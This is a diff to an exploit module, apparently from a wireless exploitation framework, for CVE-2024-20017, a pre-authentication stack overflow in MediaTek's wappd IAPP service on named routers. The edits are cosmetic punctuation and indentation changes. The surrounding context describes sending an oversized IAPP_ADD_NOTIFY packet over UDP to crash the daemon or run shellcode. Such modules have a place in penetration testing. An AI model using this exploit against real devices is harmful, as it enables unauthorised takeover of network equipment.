@@ -8,7 +8,7 @@ from wirelessxpl.core.exploit.exploit import BaseExploit
 
 
 class Exploit(BaseExploit):
-    """MediaTek MT7622/MT7915 IAPP wappd — Pre-Auth Stack Buffer Overflow (CVE-2024-20017).
+    """MediaTek MT7622/MT7915 IAPP wappd - Pre-Auth Stack Buffer Overflow (CVE-2024-20017).
 
     The ``wappd`` daemon (Inter-Access Point Protocol) on UDP/3517 does not
     validate the length field in IAPP_ADD_NOTIFY packets before copying the
@@ -19,7 +19,7 @@ class Exploit(BaseExploit):
     Affected chipsets: MT7622, MT7915, MT7916, MT7981.
     Affected vendors : TP-Link (TL-XDR6088, TL-XDR6080), Buffalo, ZTE, OEM APs.
 
-    CVSS v3.1: 9.8 (Critical) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    CVSS v3.1: 9.8 (Critical) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
 
     Author: André Henrique (LinkedIn/X: @mrhenrike)
     Version: 1.0.0
@@ -70,10 +70,10 @@ class Exploit(BaseExploit):
         """Craft an IAPP_ADD_NOTIFY packet with an oversized payload.
 
         IAPP header layout (6 bytes):
-          - version  : 1 byte  (0x01)
-          - type     : 1 byte  (0x02 = ADD_NOTIFY)
-          - length   : 2 bytes big-endian  ← intentionally set small to trigger overflow
-          - sequence : 2 bytes big-endian
+ - version  : 1 byte  (0x01)
+ - type     : 1 byte  (0x02 = ADD_NOTIFY)
+ - length   : 2 bytes big-endian  ← intentionally set small to trigger overflow
+ - sequence : 2 bytes big-endian
 
         The length field is set to 6 (header only) while the actual datagram
         carries ``payload_size`` additional bytes, causing wappd to copy past
@@ -110,7 +110,7 @@ class Exploit(BaseExploit):
             print_error(f"Target does not appear to have wappd IAPP service on UDP/{self.port}")
             return
 
-        print_success("wappd IAPP service confirmed — sending stack overflow payload")
+        print_success("wappd IAPP service confirmed - sending stack overflow payload")
         self._exploit()
 
     @mute
@@ -150,7 +150,7 @@ class Exploit(BaseExploit):
     def _exploit(self) -> None:
         if self.overflow_size <= 512:
             print_error(
-                f"overflow_size ({self.overflow_size}) must exceed 512 to overflow the stack buffer — "
+                f"overflow_size ({self.overflow_size}) must exceed 512 to overflow the stack buffer - "
                 "set a value > 512"
             )
             return
@@ -163,7 +163,7 @@ class Exploit(BaseExploit):
         response = self._send_udp(packet)
 
         if response:
-            print_info(f"Response received ({len(response)} bytes) — target may have processed packet")
+            print_info(f"Response received ({len(response)} bytes) - target may have processed packet")
         else:
             print_status("No response (expected for a crashed/shellcode-executing daemon)")
 
